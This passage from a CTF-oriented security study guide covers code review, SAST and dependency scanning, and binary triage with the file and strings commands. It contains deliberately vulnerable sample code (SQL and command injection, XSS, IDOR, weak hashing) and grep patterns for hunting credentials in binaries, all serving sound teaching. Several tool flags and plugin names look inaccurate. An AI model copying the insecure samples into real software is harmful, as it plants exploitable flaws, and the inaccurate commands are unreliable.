- Credential dumping (Mimikatz, LSASS, SAM)

---

# CUSTOM APPLICATION EXPLOITATION

## Source Code Analysis for Vulnerabilities

### Static Analysis (Manual Code Review)

Manual code review involves systematically examining source code to identify security vulnerabilities, logic flaws, and design weaknesses. This approach combines human reasoning with pattern recognition to detect issues that automated tools may miss.

#### Code Review Methodology

Establish a structured review process: identify the application's threat model and security-critical components, prioritize high-risk areas (authentication, authorization, cryptography, input validation), and focus review efforts accordingly. Security-critical code paths warrant deeper analysis than utility functions.

Review input handling comprehensively. Trace user-supplied data from entry points (HTTP requests, file uploads, API parameters) through the application to identify where sanitization, validation, or encoding occurs. Common entry points include form parameters, HTTP headers, cookies, URL paths, JSON/XML payloads, and file uploads.

Identify injection vulnerabilities by locating database queries, operating system commands, template engines, and expression evaluators that incorporate user input. Example vulnerable patterns:

```python
# SQL Injection vulnerability
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
result = db.execute(query)
```

The concatenated user input flows directly into the SQL query without parameterization.

```java
// Command injection vulnerability
String filename = request.getParameter("file");
String command = "cat /var/www/uploads/" + filename;
Runtime.getRuntime().exec(command);
```

Unsanitized filename parameter allows directory traversal and command injection.

```javascript
// XSS vulnerability (DOM-based)
const userInput = document.location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;
```

User-controlled input from URL fragment directly modifies DOM without escaping.

#### Authentication and Authorization Review

Examine credential handling: verify credentials are never logged or stored in plaintext, transmitted only over encrypted channels, and cleared from memory after use. Identify hardcoded credentials, default passwords, or credentials stored in configuration files.

```python
# Hardcoded credentials (vulnerability)
DB_USER = "admin"
DB_PASSWORD = "password123"
connection = db.connect(DB_USER, DB_PASSWORD)
```

Review session management: verify session tokens are cryptographically random, sufficiently long, securely transmitted (HTTP-only and Secure flags set), invalidated upon logout, and have appropriate timeout durations. Identify session fixation vulnerabilities where an attacker can force a victim to use a known session token.

```java
// Weak session token generation (vulnerability)
String sessionToken = String.valueOf(System.currentTimeMillis());
session.setAttribute("token", sessionToken);
```

Session tokens based on timestamps are predictable and lack sufficient entropy.

Examine authorization logic: verify that access controls are consistently enforced across all endpoints, that privilege escalation is prevented through proper validation, and that business logic does not bypass authorization checks. Identify insecure direct object references (IDOR) where object access is controlled only by user-supplied identifiers.

```javascript
// IDOR vulnerability
app.get('/api/user/:id', (req, res) => {
  const userId = req.params.id;
  const userData = db.query(`SELECT * FROM users WHERE id = ${userId}`);
  res.json(userData);
});
```

No authorization check verifies the requesting user owns the requested user ID.

#### Cryptography Review

Identify use of weak or deprecated cryptographic algorithms: MD5, SHA-1, DES, RC4, or custom cryptographic implementations. Modern applications must use NIST-approved algorithms (AES, SHA-256/384/512, HMAC).

```python
# Weak cryptography (vulnerability)
import hashlib
password_hash = hashlib.md5(password).hexdigest()
stored_hash = db.store(password_hash)
```

MD5 is cryptographically broken and unsuitable for password hashing.

```java
// Proper password hashing
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hashedPassword = encoder.encode(password);
```

BCrypt applies salt and adaptive cost factors, defending against rainbow table attacks.

Review random number generation: verify cryptographic randomness is used for security tokens, nonces, and salts. Non-cryptographic PRNGs (Math.random(), rand()) are predictable and unsuitable for security purposes.

```python
# Weak random generation (vulnerability)
import random
token = random.randint(1, 1000000)
```

Standard random module lacks cryptographic strength; predictable values compromise security.

```python
# Proper cryptographic randomness
import secrets
token = secrets.token_urlsafe(32)
```

Secrets module provides cryptographically secure random generation.

#### Data Validation and Sanitization Review

Examine input validation logic: verify that expected data types are enforced, length limits are applied, allowed character sets are restricted, and format validation matches requirements. Identify validation bypasses where different interpretation contexts create vulnerabilities.

```python
# Insufficient validation (vulnerability)
user_input = request.args.get('email')
if '@' in user_input:
    send_email(user_input)
```

Minimal validation allows malformed email addresses; no domain verification occurs.

Review output encoding: verify that data rendered in different contexts (HTML, JavaScript, URL, CSS, SQL) is appropriately encoded for that context. Context-specific encoding prevents injection vulnerabilities.

```html
<!-- XSS vulnerability: no HTML encoding -->
<h1>Welcome, <%= userName %></h1>

<!-- Correct: HTML encoding -->
<h1>Welcome, <%= htmlEscape(userName) %></h1>
```

Review file upload handling: verify file types are validated (magic bytes, not just extension), file sizes are limited, files are stored outside web root, filenames are sanitized, and virus scanning is performed.

```python
# Insecure file upload (vulnerability)
filename = request.files['file'].filename
file.save(f'/var/www/uploads/{filename}')
```

Unsanitized filename allows directory traversal; uploaded files stored in web-accessible directory.

#### Error Handling and Logging Review

Examine error handling: verify exceptions do not expose sensitive information (stack traces, database errors, file paths), that error messages are user-friendly without technical details, and that errors are logged for security monitoring.

```java
// Information disclosure via error message (vulnerability)
try {
    dbConnection = openDatabase();
} catch (SQLException e) {
    out.println("Database error: " + e.getMessage());
}
```

Exception details expose database structure and connection information.

Review logging practices: verify sensitive data (passwords, tokens, PII) is not logged, that log levels are appropriate, and that logs are protected from unauthorized access.

```python
# Sensitive data logging (vulnerability)
logging.info(f"User {username} authenticated with password {password}")
```

Password logged in plaintext; captured in log files accessible to system administrators.

#### Race Condition and Concurrency Review

Examine operations involving shared resources: verify that critical sections are properly synchronized, that time-of-check-time-of-use (TOCTOU) vulnerabilities do not exist, and that state transitions are atomic.

```python
# TOCTOU vulnerability
if user_has_sufficient_balance(account_id, amount):
    time.sleep(0.1)  # Simulates network delay
    withdraw(account_id, amount)
```

Between the balance check and withdrawal, another transaction could consume the balance.

Review financial or security-critical operations: verify pessimistic locking (lock before read) is used for high-value transactions, and that idempotent operations prevent duplicate processing.

#### API and Service Boundary Review

Examine API endpoints: verify all endpoints enforce authentication and authorization, accept only expected HTTP methods, validate all input parameters, and return appropriate HTTP status codes. Identify endpoints that expose sensitive operations without proper access controls.

```rest
# Unrestricted API endpoint (vulnerability)
GET /admin/users/delete?id=123
```

No authentication check; deletion triggered by simple parameter.

Review service-to-service communication: verify mutual TLS is used, API keys are sufficiently random and rotated regularly, and request signing prevents tampering.

#### Library and Framework-Specific Vulnerabilities

Review framework-specific configurations: verify CSRF protection is enabled, security headers are configured (Content-Security-Policy, X-Frame-Options, Strict-Transport-Security), and default security features are not disabled.

```python
# Django: CSRF protection misconfiguration
@csrf_exempt  # Disables CSRF token verification (vulnerability)
def process_payment(request):
    amount = request.POST.get('amount')
    charge_card(amount)
```

CSRF exemption removes cross-site request forgery protection from sensitive operation.

### SAST Tools (SonarQube, Checkmarx, Fortify)

Static Application Security Testing (SAST) tools automatically analyze source code to identify vulnerabilities, code quality issues, and security weaknesses. These tools scale analysis across large codebases and detect common vulnerability patterns.

#### SonarQube Setup and Configuration

Install SonarQube server (community edition):

```bash
# Download and extract SonarQube
wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-10.0.0.68432.zip
unzip sonarqube-10.0.0.68432.zip
cd sonarqube-10.0.0.68432

# Start SonarQube server
./bin/linux-x86-64/sonar.sh console
```

SonarQube web interface available at `http://localhost:9000` (default credentials: admin/admin).

Configure project analysis by creating a `sonar-project.properties` file in the project root:

```properties
sonar.projectKey=MyProject
sonar.projectName=My Project
sonar.projectVersion=1.0
sonar.sources=src
sonar.exclusions=src/test/**,**/node_modules/**
sonar.java.binaries=target/classes
sonar.language=java
```

Run SonarQube scanner using the SonarScanner CLI:

```bash
sonar-scanner \
  -Dsonar.projectKey=MyProject \
  -Dsonar.sources=. \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=<auth_token>
```

Authentication tokens are generated in SonarQube's user settings.

#### SonarQube Vulnerability Detection

SonarQube identifies vulnerability patterns across multiple languages (Java, Python, JavaScript, C#, C++, Go, PHP, Ruby, TypeScript, etc.). Configure quality gates to enforce security standards:

Access SonarQube administration panel: Settings > Security > Quality Gates.

Create custom quality gate with security-focused rules:

- Critical security issues: 0
- High-severity security issues: 0 (or configure threshold)
- Security hotspots reviewed: 100%
- Coverage: minimum 80%

Suppress false positives by marking specific issues as won't fix or false positive in the SonarQube interface. Add code comments to document suppression rationale:

```java
// False positive: benign iteration
for (String item : items) {
    // @SuppressWarnings("java:S3776")
    process(item);
}
```

#### Checkmarx SAST Configuration

Checkmarx provides proprietary vulnerability detection with custom rulesets. Installation requires enterprise licensing.

[Unverified] Checkmarx integrates with CI/CD pipelines through plugins for Jenkins, GitLab, Azure DevOps, and GitHub Actions.

Configure Checkmarx scanning in a Jenkins pipeline:

```groovy
pipeline {
    agent any
    stages {
        stage('Checkmarx Scan') {
            steps {
                step([$class: 'CxScanBuilder',
                    checkmarxServerUrl: 'https://checkmarx-server/',
                    checkmarxCredentials: 'checkmarx-creds',
                    projectName: 'MyProject',
                    sourceLocation: '.',
                    useSourceDirectory: true,
                    excludeFolders: 'test,node_modules'
                ])
            }
        }
    }
}
```

Checkmarx generates reports with vulnerability classifications (SQL Injection, XSS, CSRF, etc.) and severity ratings. Export reports in multiple formats (XML, PDF, CSV) for compliance documentation.

#### Fortify Static Code Analyzer

Fortify (by Micro Focus) provides comprehensive SAST with support for 25+ languages and frameworks.

[Unverified] Fortify licensing includes on-premises and cloud-based deployment options; cloud licensing is accessed through the Fortify Software Security Center (SSC).

Run Fortify source code scan:

```bash
sourceanalyzer -b MyProject -source-root src -exclude test
sourceanalyzer -b MyProject -scan -f results.fpr
ReportGenerator -format pdf -f results.fpr -o report.pdf
```

The `-b` flag specifies the build label, `-source-root` defines source directory, `-scan` executes vulnerability analysis, and `-f` specifies output file path.

Import Fortify results into audit framework:

```bash
auditassistant -dapterType FileAdapter \
  -inputFile results.fpr \
  -sessionId MyProject
```

Fortify provides remediation guidance with code snippets demonstrating secure alternatives:

```java
// Vulnerable pattern
String query = "SELECT * FROM users WHERE id = " + userId;
ResultSet rs = statement.executeQuery(query);

// Fortify recommended fix
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
```

### Code Compilation Analysis

Compilation analysis examines intermediate representations and compiled bytecode to detect vulnerabilities that manifest during compilation or runtime. This approach identifies issues that source-level analysis may miss.

#### Bytecode Analysis for Java

Analyze compiled Java bytecode using tools that examine class files before runtime execution. Bytecode inspection reveals:

- Security manager bypass attempts
- Reflection-based code that dynamically loads classes
- Native method calls that invoke compiled code
- Hardcoded credentials in string constants
- Insecure serialization patterns

Use Javap (Java disassembler) to examine bytecode:

```bash
javap -c -private -classpath . com.example.Application
```

Output displays the disassembled bytecode with method implementations, field access, and constant pool entries.

Use FindBugs/SpotBugs to detect bug patterns in compiled Java:

```bash
spotbugs -textui -high -onlyAnalyze "com.example.*" -outputFile report.txt application.jar
```

SpotBugs identifies suspicious patterns including:

- Comparison using `==` instead of `.equals()`
- Null pointer dereferences
- Infinite loops
- Dead code
- Hardcoded database passwords

[Inference] SpotBugs does not focus on security vulnerabilities but rather general bug patterns; combining SpotBugs with SAST tools provides complementary coverage.

#### Intermediate Language Analysis for .NET

Analyze .NET assemblies using IL (Intermediate Language) disassemblers to examine compiled code:

```bash
ilspy -f MyAssembly.dll --outputdir decompiled
```

ILSpy decompiles .NET assemblies to C# for human-readable analysis.

Examine Common Intermediate Language (CIL) directly:

```bash
monodis MyAssembly.dll > assembly.il
```

This reveals low-level operations including method calls, field access, and type information.

Use Roslyn (Microsoft's C# compiler platform) for AST (Abstract Syntax Tree) analysis:

```csharp
var syntaxTree = CSharpSyntaxTree.ParseText(sourceCode);
var root = syntaxTree.GetRoot() as CompilationUnitSyntax;
var methods = root.DescendantNodes().OfType<MethodDeclarationSyntax>();
foreach (var method in methods) {
    var hasVulnerablePattern = AnalyzeMethodForVulnerabilities(method);
}
```

This enables custom vulnerability detection rules specific to organizational security policies.

#### C/C++ Compilation Analysis

Analyze compiled C/C++ binaries using static analysis of generated assembly code:

```bash
gcc -fsanitize=address -fsanitize=undefined -fno-omit-frame-pointer source.c -o binary
```

Compile with sanitizers enabled to detect memory safety issues (buffer overflows, use-after-free, undefined behavior) at runtime.

Use Clang Static Analyzer for compile-time analysis:

```bash
clang --analyze source.c
```

The analyzer detects common errors including null pointer dereferences, buffer overflows, and resource leaks.

Extract debug symbols from compiled binaries to correlate vulnerabilities with source lines:

```bash
objdump -t -S binary > disassembly.txt
```

This output includes source line annotations when debug symbols are present.

#### Runtime Bytecode Instrumentation

Monitor compiled code during execution to detect security violations:

```bash
java -javaagent:agent.jar -cp . Application
```

Custom Java agents intercept bytecode before loading to insert security checks:

```java
public static void premain(String agentArgs, Instrumentation inst) {
    inst.addTransformer(new SecurityTransformer());
}

class SecurityTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className,
            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
            byte[] classfileBuffer) {
        // Inject security checks into bytecode
        return modifyBytecode(classfileBuffer);
    }
}
```

[Inference] Runtime instrumentation adds overhead and may not scale for performance-critical applications; this approach is most suitable for development and testing environments.

#### Compiler Warning Analysis

Enable compiler warnings to catch potential vulnerabilities during compilation:

```bash
# GCC/Clang: enable all warnings
gcc -Wall -Wextra -Wpedantic source.c

# Treat warnings as errors
gcc -Wall -Wextra -Werror source.c
```

Relevant warning flags for security analysis:

- `-Wformat`: Format string vulnerabilities
- `-Wformat-security`: Additional format string checks
- `-Wstack-protector`: Stack canary insertion
- `-Wstrict-overflow`: Integer overflow detection
- `-Wuninitialized`: Uninitialized variable usage

Disable false-positive warnings through pragmas:

```c
#pragma GCC diagnostic ignored "-Wunused-result"
```

### Dependency Vulnerability Scanning

Applications depend on external libraries and frameworks that may contain known vulnerabilities. Dependency scanning identifies vulnerable dependencies requiring updates or replacement.

#### npm audit (Node.js/JavaScript)

npm audit scans the `package.json` and `package-lock.json` files to identify vulnerable dependencies in the npm registry:

```bash
npm audit
```

Output displays vulnerability count, severity levels (low, moderate, high, critical), and descriptions. Example output:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ found 3 vulnerabilities                                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│ Moderate   │ Prototype Pollution in lodash                                  │
│ Package    │ lodash                                                          │
│ Dependency │ express > lodash                                               │
│ More info  │ https://github.com/lodash/lodash/security/advisories/1096     │
└─────────────────────────────────────────────────────────────────────────────┘
```

Apply automated fixes:

```bash
npm audit fix
```

This command updates vulnerable dependencies to patched versions. For major version updates requiring code changes:

```bash
npm audit fix --force
```

Configure npm audit settings in `.npmrc`:

```
audit-level=moderate
```

This configures the minimum severity level that triggers a non-zero exit code (useful for CI/CD pipeline failures).

Generate detailed audit reports:

```bash
npm audit --json > audit-report.json
npm audit --html > audit-report.html
```

#### pip check (Python)

pip check identifies incompatible or vulnerable dependencies:

```bash
pip check
```

Output identifies dependency conflicts and known security issues:

```
Package A 1.0.0 requires Package B (>=2.0), but you have Package B 1.5.0 installed.
```

Install dependencies from a requirements file with vulnerability scanning:

```bash
pip install --require-hashes -r requirements.txt
```

The `--require-hashes` flag requires all packages have hash verification, preventing man-in-the-middle attacks and ensuring package integrity.

Use `safety` package for Python vulnerability scanning:

```bash
pip install safety
safety check
```

Output displays known security vulnerabilities in installed packages:

```
╰ python-version: 3.10.0
├ package: django
│ ├ version: 2.2.0
│ ├ vulnerability: CVE-2021-4227 (Django SQL injection vulnerability)
│ └ advisory: "..."
```

Configure safety to scan specific files:

```bash
safety check -r requirements.txt --json > safety-report.json
```

#### OWASP Dependency-Check

OWASP Dependency-Check scans project dependencies against the National Vulnerability Database (NVD), identifying known vulnerabilities across multiple languages and package managers.

Install Dependency-Check:

```bash
# Download
wget https://github.com/jeremylong/DependencyCheck_Home/releases/download/v8.1.2/dependency-check-8.1.2-release.zip
unzip dependency-check-8.1.2-release.zip

# Run scan
./dependency-check/bin/dependency-check.sh --project "MyProject" --scan /path/to/project
```

Scan specific file types:

```bash
dependency-check.sh --project "MyProject" \
  --scan /path/to/project \
  --format JSON \
  --out ./reports
```

Output formats include JSON, XML, HTML, and CSV for integration with reporting tools.

Configure Dependency-Check with suppression rules to exclude false positives:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.2.0.xsd">
  <suppress>
    <cve>CVE-2021-1234</cve>
    <justification>False positive - not applicable to our usage</justification>
  </suppress>
</suppressions>
```

Run Dependency-Check with suppression file:

```bash
dependency-check.sh --project "MyProject" \
  --scan /path/to/project \
  --suppressionFile ./suppression.xml
```

#### Maven Dependency Analysis

Maven projects include dependency vulnerability scanning through plugins:

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-dependency-check-plugin</artifactId>
    <version>8.1.2</version>
    <configuration>
        <format>ALL</format>
        <outputDirectory>./target/dependency-check</outputDirectory>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

Run Maven Dependency-Check:

```bash
mvn org.apache.maven.plugins:maven-dependency-check-plugin:check
```

#### Gradle Dependency Management

Gradle projects scan dependencies using OWASP Dependency-Check plugin:

```gradle
plugins {
    id "org.owasp.dependencycheck" version "8.1.2"
}

dependencyCheck {
    format = 'ALL'
    outputDirectory = 'build/dependency-check'
}
```

Run Gradle Dependency-Check:

```bash
gradle dependencyCheckAnalyze
```

#### CI/CD Integration for Dependency Scanning

Integrate dependency scanning into continuous integration pipelines to prevent vulnerable dependencies from being deployed.

GitHub Actions workflow for npm audit:

```yaml
name: Dependency Scan
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm install
      - run: npm audit --audit-level=moderate
```

GitLab CI pipeline for pip check:

```yaml
dependency_check:
  image: python:3.10
  script:
    - pip install -r requirements.txt
    - pip install safety
    - safety check
```

#### Software Bill of Materials (SBOM) Generation

Generate SBOM to document all dependencies for compliance and vulnerability tracking:

```bash
# Using npm
npm sbom --output sbom.spdx.json

# Using Dependency-Check
dependency-check.sh --project "MyProject" --scan . --format CYCLONEDX --out ./sbom
```

SBOM formats include Software Package Data Exchange (SPDX) and CycloneDX, enabling standardized dependency documentation and automated tooling.

### Comparative Tool Analysis for CTF Scenarios

Manual code review provides deep contextual analysis and identifies logic-based vulnerabilities that automated tools miss but requires significant time investment. SAST tools rapidly analyze large codebases and enforce consistent security standards through quality gates but generate false positives requiring manual triage. Compilation analysis detects runtime-specific vulnerabilities and bytecode-level issues but typically requires language-specific expertise. Dependency scanning identifies known vulnerabilities in third-party libraries with minimal false positives but does not identify custom vulnerability patterns.

CTF source code analysis challenges typically combine these approaches: automated tools provide initial vulnerability identification, manual review validates findings and explores exploitation feasibility, and compilation analysis confirms vulnerability presence in compiled artifacts. Effective CTF exploitation requires understanding both vulnerability mechanics and the specific implementation details revealed through comprehensive code analysis.

---

## Binary Analysis & Reverse Engineering

### File Type Identification (file command)

File type identification is the first step in binary analysis, determining the executable format, architecture, and characteristics before deeper investigation. The `file` command uses magic bytes and structural analysis to classify binaries.

#### Basic File Command Usage

**Standard Identification:**

bash

```bash
# Basic file type detection
file binary_sample

# Verbose output
file -v binary_sample

# Follow symbolic links
file -L binary_link

# Check multiple files
file /bin/* | grep "ELF 64-bit"
```

**Common Output Formats:**

**ELF Binaries (Linux):**

bash

```bash
file /bin/ls
# Output: /bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped
```

**PE Binaries (Windows):**

bash

```bash
file malware.exe
# Output: malware.exe: PE32+ executable (console) x86-64, for MS Windows
# or: PE32 executable (GUI) Intel 80386, for MS Windows
```

**Mach-O Binaries (macOS):**

bash

```bash
file /bin/bash
# Output: /bin/bash: Mach-O 64-bit executable x86_64
```

#### Advanced File Analysis

**Magic Bytes Analysis:**

bash

```bash
# Display magic bytes with hexdump
hexdump -C binary_sample | head -n 5

# Check specific magic bytes
head -c 4 binary_sample | xxd
# ELF: 7f 45 4c 46
# PE:  4d 5a (MZ)
# Mach-O: cf fa ed fe (64-bit) or ce fa ed fe (32-bit)
```

**MIME Type Detection:**

bash

```bash
# Get MIME type
file --mime-type binary_sample
# Output: binary_sample: application/x-executable

# Full MIME information
file --mime binary_sample
# Output: binary_sample: application/x-executable; charset=binary
```

**Special File Types:**

bash

```bash
# Identify packed/compressed executables
file packed_binary
# Output: packed_binary: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed

# Identify script files
file suspicious_script
# Output: suspicious_script: Bourne-Again shell script, ASCII text executable

# Identify library files
file library.so
# Output: library.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
```

#### Architecture and Platform Detection

**Determine Binary Architecture:**

bash

```bash
# Check architecture explicitly
file binary_sample | grep -oP "(x86-64|i386|ARM|MIPS|PowerPC)"

# Identify 32-bit vs 64-bit
file binary_sample | grep -q "64-bit" && echo "64-bit" || echo "32-bit"
```

**Cross-Platform Identification:**

bash

```bash
# Identify Windows binaries on Linux
file windows_malware.exe
# Output: windows_malware.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows

# Identify Android binaries
file app.apk
# Output: app.apk: Zip archive data, at least v2.0 to extract

file classes.dex
# Output: classes.dex: Dalvik dex file version 035
```

#### Binary Characteristics Detection

**Stripped vs Non-Stripped:**

bash

```bash
# Stripped binary (symbols removed)
file stripped_binary
# Output: stripped_binary: ELF 64-bit LSB executable, x86-64, stripped

# Non-stripped binary (symbols present)
file debug_binary
# Output: debug_binary: ELF 64-bit LSB executable, x86-64, not stripped
```

**Dynamic vs Static Linking:**

bash

```bash
# Dynamically linked
file /bin/ls
# Output: ...dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2...

# Statically linked
file static_binary
# Output: ...statically linked...
```

#### Specialized File Type Detection

**Packed/Obfuscated Binaries:**

bash

```bash
# Common packers identification
file sample.exe | grep -E "(UPX|ASPack|PECompact|Themida)"

# Check entropy (high entropy suggests packing/encryption)
ent sample.exe
# Entropy values near 8.0 indicate compression/encryption
```

**Script Analysis:**

bash

```bash
# Identify script interpreters
file script.py
# Output: script.py: Python script, ASCII text executable

file script.sh
# Output: script.sh: Bash script, UTF-8 Unicode text executable

# Identify compiled Python
file script.pyc
# Output: script.pyc: python 3.8 byte-compiled
```

#### Custom Magic Database

**Using Custom Magic Files:**

bash

```bash
# Specify custom magic file
file -m custom_magic.mgc binary_sample

# Compile magic file
file -C -m custom_magic

# Check default magic database
file --help | grep magic
```

**[Inference]** Custom magic databases enable detection of proprietary formats or malware-specific signatures not included in standard magic files.

#### Alternative Tools for File Identification

**TrID (File Identifier):**

bash

```bash
# More detailed file type identification
trid binary_sample

# Update TrID definitions
trid -u
```

**exiftool (Metadata Extraction):**

bash

```bash
# Extract comprehensive metadata
exiftool binary_sample

# Specific fields
exiftool -FileType -MIMEType -FileSize binary_sample
```

**readelf (ELF Analysis):**

bash

```bash
# ELF header information
readelf -h binary_sample

# Program headers
readelf -l binary_sample

# Section headers
readelf -S binary_sample
```

**pefile (Python PE Analysis):**

python

```python
import pefile

pe = pefile.PE('sample.exe')
print(f"Machine: {hex(pe.FILE_HEADER.Machine)}")
print(f"Sections: {pe.FILE_HEADER.NumberOfSections}")
print(f"Timestamp: {pe.FILE_HEADER.TimeDateStamp}")
```

#### Detection Evasion Analysis

**Polyglot Files:**

bash

```bash
# Files valid as multiple formats
file polyglot_sample
# May show: PDF document, version 1.4 (but also contains executable code)

# Check multiple layers
binwalk polyglot_sample
```

**Format Confusion:**

bash

```bash
# Extension doesn't match content
mv malware.exe document.pdf
file document.pdf
# Output: document.pdf: PE32 executable (GUI) Intel 80386, for MS Windows

# Real content type revealed despite misleading extension
```

---

### Strings Extraction (strings command)

The `strings` command extracts human-readable character sequences from binaries, revealing hardcoded credentials, URLs, function names, debug messages, and embedded resources critical for reverse engineering.

#### Basic Strings Extraction

**Standard Usage:**

bash

```bash
# Extract ASCII strings (minimum 4 characters default)
strings binary_sample

# Save output to file
strings binary_sample > strings_output.txt

# Display with file offsets
strings -t x binary_sample
# -t d: decimal offsets
# -t o: octal offsets
# -t x: hexadecimal offsets
```

**Minimum String Length:**

bash

```bash
# Default 4-character minimum
strings binary_sample

# Custom minimum length (e.g., 8 characters)
strings -n 8 binary_sample

# Very short strings (3 characters minimum)
strings -n 3 binary_sample | grep -E "^.{3}$"
```

#### Character Encoding Detection

**Multi-Encoding Extraction:**

bash

```bash
# ASCII strings (default)
strings -a binary_sample

# Unicode strings (little-endian 16-bit)
strings -el binary_sample

# Unicode strings (big-endian 16-bit)
strings -eb binary_sample

# All encodings
strings -a -el -eb binary_sample | sort -u
```

**Windows Binaries (Unicode):**

bash

```bash
# Extract Unicode from PE files
strings -el windows_binary.exe

# Combine ASCII and Unicode
(strings windows_binary.exe; strings -el windows_binary.exe) | sort -u
```

#### Targeted String Searches

**Common Patterns:**

bash

```bash
# URLs and domains
strings binary_sample | grep -E "https?://|www\.|\.com|\.net"

# IP addresses
strings binary_sample | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Email addresses
strings binary_sample | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"

# File paths (Windows)
strings binary_sample | grep -E "C:\\|\\\\[A-Za-z]+"

# File paths (Linux)
strings binary_sample | grep -E "^/[a-zA-Z0-9/_-]+"
```

**Function and API Names:**

bash

```bash
# Windows API calls
strings binary_sample | grep -E "(CreateFile|WriteFile|VirtualAlloc|LoadLibrary|GetProcAddress)"

# Linux syscalls
strings binary_sample | grep -E "(open|read|write|execve|socket|connect)"

# Cryptographic functions
strings binary_sample | grep -iE "(crypt|hash|aes|rsa|md5|sha)"
```

**Credentials and Secrets:**

bash

```bash
# Password-related strings
strings binary_sample | grep -iE "(password|passwd|pwd|credential|secret|token)"

# API keys and tokens
strings binary_sample | grep -E "[A-Za-z0-9]{32,}"

# Base64 encoded data (potential)
strings binary_sample | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$"
```

#### Advanced String Analysis

**Context Window Display:**

bash

```bash
# Show surrounding bytes (requires xxd)
strings -t x binary_sample | while read offset str; do
    echo "Offset: $offset - String: $str"
    xxd -s 0x$offset -l 64 binary_sample | head -n 4
done
```

**Statistical Analysis:**

bash

```bash
# Most common strings
strings binary_sample | sort | uniq -c | sort -rn | head -20

# String length distribution
strings binary_sample | awk '{print length}' | sort -n | uniq -c

# Unique character analysis
strings binary_sample | tr -d '\n' | fold -w1 | sort | uniq -c | sort -rn
```

**Section-Specific Extraction:**

bash

```bash
# Extract strings from specific ELF section
objdump -s -j .rodata binary_sample | grep -o '[[:print:]]\{4,\}'

# Extract from .data section
readelf -x .data binary_sample | cut -c 13-50 | xxd -r | strings

# Windows PE sections
objdump -s -j .rdata windows_binary.exe | grep -o '[[:print:]]\{4,\}'
```

#### Filtering and Processing

**Remove Noise:**

bash

```bash
# Filter out common system strings
strings binary_sample | grep -vE "(GNU|GCC|libc|stdio\.h)"

# Remove short meaningless strings
strings -n 8 binary_sample | grep -vE "^[^a-zA-Z]*$"

# Dictionary-based filtering (English words only)
strings binary_sample | grep -f /usr/share/dict/words
```

**Regular Expression Patterns:**

bash

```bash
# Registry keys (Windows)
strings binary_sample | grep -E "HKEY_(LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT)"

# Executable extensions
strings binary_sample | grep -iE "\.(exe|dll|sys|bat|ps1|vbs)$"

# Network artifacts
strings binary_sample | grep -E "(POST|GET|User-Agent|Cookie|Authorization)"
```

#### Bulk Analysis

**Multiple File Processing:**

bash

```bash
# Process directory of binaries
for file in /samples/*; do
    echo "=== $file ==="
    strings "$file" | grep -E "(http|password|key)"
done

# Parallel processing
find /malware_samples -type f -exec strings {} \; | sort -u > all_strings.txt
```

**Comparative Analysis:**

bash

```bash
# Compare strings between two binaries
comm -12 <(strings binary1 | sort) <(strings binary2 | sort)

# Find unique strings in binary1
comm -23 <(strings binary1 | sort) <(strings binary2 | sort)
```

#### Obfuscation Detection

**Entropy-Based String Detection:**

bash

```bash
# Calculate string entropy (high entropy = potential obfuscation)
strings binary_sample | while read line; do
    entropy=$(echo -n "$line" | ent | grep Entropy | awk '{print $3}')
    echo "$entropy : $line"
done | sort -rn
```

**Stack String Detection:**

bash

```bash
# Short fragmented strings (stack string obfuscation indicator)
strings -n 2 binary_sample | awk 'length($0) <= 4' | head -50
```

**[Inference]** Stack string obfuscation stores strings as individual characters pushed onto the stack, resulting in many short 1-3 character strings that reconstruct at runtime.

#### Integration with Other Tools

**Combined with Grep for Analysis:**

bash

```bash
# Create structured report
{
    echo "=== URLs ==="
    strings binary_sample | grep -E "https?://"
    echo -e "\n=== IPs ==="
    strings binary_sample | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
    echo -e "\n=== Suspicious Functions ==="
    strings binary_sample | grep -E "(VirtualAlloc|CreateRemoteThread|WriteProcessMemory)"
} > analysis_report.txt
```

**YARA Rule Creation:**

bash

```bash
# Generate YARA rule from unique strings
strings binary_sample | sort -u | head -10 | while read str; do
    echo "        \$ = \"$str\" ascii"
done
```

**Radare2 Integration:**

bash

```bash
# Use radare2 for string analysis
r2 -q -c 'iz' binary_sample  # List strings in data sections
r2 -q -c 'izz' binary_sample # List all strings including code sections
```

#### Strings in Memory Dumps

**Process Memory Analysis:**

bash

```bash
# Extract strings from memory dump
strings -a memory_dump.dmp | grep -E "(http|password|key)"

# Analyze specific memory region
dd if=memory_dump.dmp bs=1 skip=$((0x400000)) count=$((0x100000)) | strings
```

**Volatility Integration:**

bash

```bash
# Extract strings from process memory (using Volatility)
vol.py -f memory_dump.raw --profile=Win7SP1x64 strings -s strings_output.txt
```

